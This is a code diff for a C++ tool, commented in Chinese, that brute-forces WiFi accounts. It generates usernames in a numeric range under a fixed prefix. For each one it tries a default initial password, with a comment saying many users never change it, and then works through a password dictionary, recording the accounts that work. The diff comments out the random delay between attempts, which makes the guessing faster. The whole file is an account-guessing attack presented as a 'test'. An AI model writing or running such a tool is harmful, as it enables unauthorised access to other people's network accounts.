@@ -25,10 +25,8 @@
 #include <iostream>
 #include "WebRequests.hpp"
 #include "UsernameGenerator.hpp"
-#include "DictionaryIndexer.hpp"
 
 CSV_Operations csv_op;
-DictionaryIndexer dic;
 
 /**
  * WIFI_Test 类用于测试和记录WIFI账户的有效性。
@@ -59,26 +57,26 @@ private:
 
 public:
     // 构造函数: 初始化测试参数
-    WIFI_Test(std::string gen_mode = "ir",
-              uint64_t maxDecrement = 8,
-              const uint16_t amount = 1000,
-              const uint64_t minNum = 8143086109,
-              const uint64_t maxNum = 9390026092,
-              uint32_t pwdTryNum = 100,
-              const std::string &usernamePrefix = "043111",
-              const std::string &initialPassword = "000000") :
+    WIFI_Test(std::string gen_mode = "s",                       // 用户名列表生成模式
+              uint32_t pwdTryNum = 100,                         // 密码尝试次数
+              const uint16_t amount = 1000,                     // 需生成的用户名数量
+              const uint64_t minNum = 8143086109,               // 用户名尝试范围的最小值
+              const uint64_t maxNum = 9975813272,               // 用户名尝试范围的最大值
+              uint64_t maxDecrement = 8,                        // 生成用户名时随机递减值的最大限度
+              const std::string &usernamePrefix = "043111",     // 用户名前缀
+              const std::string &initialPassword = "000000") :  // 账户的初始密码
         gen_mode(gen_mode),
-        maxDecrement(maxDecrement),
+        pwdTryNum(pwdTryNum),
         amount(amount),
         minNum(minNum),
         maxNum(maxNum),
-        pwdTryNum(pwdTryNum),
+        maxDecrement(maxDecrement),
         usernamePrefix(usernamePrefix),
         initialPassword(initialPassword) {}
 
     // 开始执行WIFI账户的有效性测试。
     void runTests() {
-        UsernameGenerator ug(amount, minNum, maxNum);
+        UsernameGenerator ug(amount, minNum, maxNum, usernamePrefix);
 
         /**
          * 生成用户名列表;
@@ -88,18 +86,21 @@ public:
         ug.generateUsernamesList(gen_mode, maxDecrement);
 
         // 读取密码字典;
-        dic.readDictionary("./Dictionary.csv");
+        dic.readDictionary();
+
+        // 获取有效账户的数目
+        effectiveAccountAmount = dic.getEffectiveAccountAmount();
 
         while (true) {
-            // 从用户名列表中抽取用户名(格式:前缀+抽取的用户名)
-            currentUsername = usernamePrefix + ug.extractUniqueUsernam();
+            // 从用户名列表中抽取用户名
+            currentUsername = ug.extractUniqueUsernam();
 
             // 如果用户名已被全部抽取完,则结束循环
-            if (currentUsername == usernamePrefix) break;
+            if (currentUsername == "") break;
 
             system("CLS");
-            std::cout << "正在尝试第 " << ++usernameNum << " 个用户名.\t" <<
-                "共找到 " << effectiveAccountNum << " 个有效账户.\n" << std::endl;
+            std::cout << "正在尝试第 " << ++usernameNum << " 个用户名, " <<
+                "共找到 " << effectiveAccountNum << "/" << effectiveAccountNum + effectiveAccountAmount << " 个有效账户.\n" << std::endl;
 
             // 设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!)
             currentPassword = initialPassword;
@@ -131,7 +132,7 @@ public:
                 if (currentPassword == "") break;
 
                 // 随机延时;
-                tl.randomDelay(0, 1000);
+                // tl.randomDelay(0, 1000);
             }
         }
     }
@@ -140,12 +141,13 @@ private:
     uint32_t usernameNum = 0;                       // 用于记录已经尝试过的用户名数目;
     uint32_t effectiveAccountNum = 0;               // 用于记录有效账户数;
     std::string currentUsername, currentPassword;   // 当前正在尝试的用户名和密码;
+    uint32_t effectiveAccountAmount;                // 保存在EffectiveAccount.csv文件中的已验证的有效账户数目;
 };
 
 int main() {
     tl.displayInfo();       // 显示版本信息
 
-    tl.displayDictionary(); // 显示字典内容
+    //tl.displayDictionary(); // 显示字典内容
 
     WIFI_Test test;     // 初始化测试参数
 
